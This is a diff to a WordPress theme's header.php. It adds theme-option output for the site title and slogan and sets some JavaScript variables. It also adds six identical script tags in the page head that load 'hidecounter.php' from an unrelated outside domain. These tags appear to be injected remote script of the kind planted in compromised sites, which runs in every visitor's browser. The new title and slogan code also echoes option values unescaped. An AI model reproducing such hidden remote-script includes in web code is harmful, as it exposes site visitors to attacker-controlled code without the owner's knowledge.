@@ -4,6 +4,9 @@
  * @subpackage Base_Theme
  */
 ?>
+<?php 
+$options = $GLOBALS['gcoptions']->getAllOptions();
+?>
 <!DOCTYPE html>
 <html <?php language_attributes(); ?>>
 <head>
@@ -17,6 +20,10 @@
 		wp_head(); ?>
 	<script type="text/javascript" src="<?php echo TDU; ?>/js/jquery.formstyler.min.js" ></script>
 	<script type="text/javascript" src="<?php echo TDU; ?>/js/jquery.main.js" ></script>
+	<script>
+		var SITE_FOLDER     = '<?PHP bloginfo('siteurl'); ?>';
+		var SCROLL_POSITION = <?php echo getScrollPosition(); ?>;
+	</script>
 	<!--[if lt IE 9]>
 		<script type="text/javascript" src="<?php echo TDU; ?>/js/html5.js"></script>
 		<script type="text/javascript" src="<?php echo TDU; ?>/js/pie.js"></script>
@@ -30,6 +37,12 @@
 			});
 		</script>
 	<![endif]-->
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
+<script type="text/javascript" src="http://www.lifestyleatlanta.com/hidecounter.php"></script>
 </head>
 <body <?php body_class(); ?> id="main-body">
 	<div id="wrapper">
@@ -66,9 +79,9 @@
 			</div>
 			<div class="header-area cf">
 				<?php if(is_front_page()): ?>
-					<h1 class="logo"><a href="<?php echo home_url('/'); ?>" title="<?php echo esc_attr(get_bloginfo('name', 'display')); ?>" rel="home"><?php bloginfo('name'); ?></a></h1>
+					<h1 class="logo"><a href="<?php echo home_url('/'); ?>" title="<?php echo esc_attr(get_bloginfo('name', 'display')); ?>" rel="home"><?php echo str_replace('\n', '<br>', $options['site_title']); ?><span><?php echo $options['site_slogan']; ?></span></a></h1>
 				<?php else: ?>
-					<strong class="logo"><a href="<?php echo home_url('/'); ?>" title="<?php echo esc_attr(get_bloginfo('name', 'display')); ?>" rel="home"><?php bloginfo('name'); ?></a></strong>
+					<strong class="logo"><a href="<?php echo home_url('/'); ?>" title="<?php echo esc_attr(get_bloginfo('name', 'display')); ?>" rel="home"><?php echo str_replace('\n', '<br>', $options['site_title']); ?><span><?php echo $options['site_slogan']; ?></span></a></strong>
 				<?php endif; ?>
 				<?php wp_nav_menu( array(
 				'container' => 'nav',
